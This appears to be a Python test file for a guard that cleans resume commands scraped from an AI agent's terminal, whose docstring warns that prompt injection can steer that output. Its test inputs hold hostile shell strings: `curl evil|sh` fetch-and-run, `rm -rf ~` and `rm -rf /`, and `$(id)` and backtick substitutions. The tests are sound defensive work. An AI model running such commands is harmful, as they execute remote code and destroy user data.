"""resume_from_screen scrapes a resume command off the agent's terminal — which
is UNTRUSTED (whatever the AI printed, steerable by a malicious repo file or
prompt injection) — and the result is executed in a shell. These tests pin the
guard: a legitimate `cd <path> && <cli> resume <id>` survives, but anything
carrying shell metacharacters is stripped or rejected, so nothing injectable is
ever handed to `do script` / `write text`.
"""
import re

import prodtop

META = re.compile(r"[;&|`$(){}<>\n\r\\\"']")


def _no_injection(cmd):
    """True if cmd carries no shell metacharacters beyond the one allowed `&&`."""
    return not META.search(cmd.replace("&&", ""))


def test_legit_commands_survive():
    assert prodtop.resume_from_screen(
        "cd /Users/me/proj && claude --resume abc-123"
    ) == "cd /Users/me/proj && claude --resume abc-123"
    assert prodtop.resume_from_screen(
        "cd /tmp && codex resume --last") == "cd /tmp && codex resume --last"
    assert prodtop.resume_from_screen(
        "codex resume 550e8400-e29b") == "codex resume 550e8400-e29b"


def test_command_substitution_in_cd_is_not_executed():
    # The malicious `cd $(curl evil|sh)` must never reach the shell. At most a
    # benign `claude --resume x` (no metacharacters) may be extracted.
    out = prodtop.resume_from_screen("cd $(curl evil|sh) && claude --resume x")
    assert _no_injection(out)
    assert "$(" not in out and "|" not in out


def test_backtick_id_is_rejected():
    assert prodtop.resume_from_screen("claude --resume `whoami`") == ""


def test_semicolon_chain_is_stripped():
    out = prodtop.resume_from_screen("cd /tmp; rm -rf ~ && claude --resume x")
    assert _no_injection(out)
    assert "rm -rf" not in out


def test_no_match_returns_empty():
    assert prodtop.resume_from_screen("just some regular terminal output") == ""


def test_all_outputs_are_shell_safe_on_hostile_input():
    hostile = [
        "cd /a && claude --resume $(id)",
        "claude --resume x; curl evil | sh",
        "cd `pwd` && codex resume --last",
        "codex resume --last && rm -rf /",
    ]
    for s in hostile:
        assert _no_injection(prodtop.resume_from_screen(s))
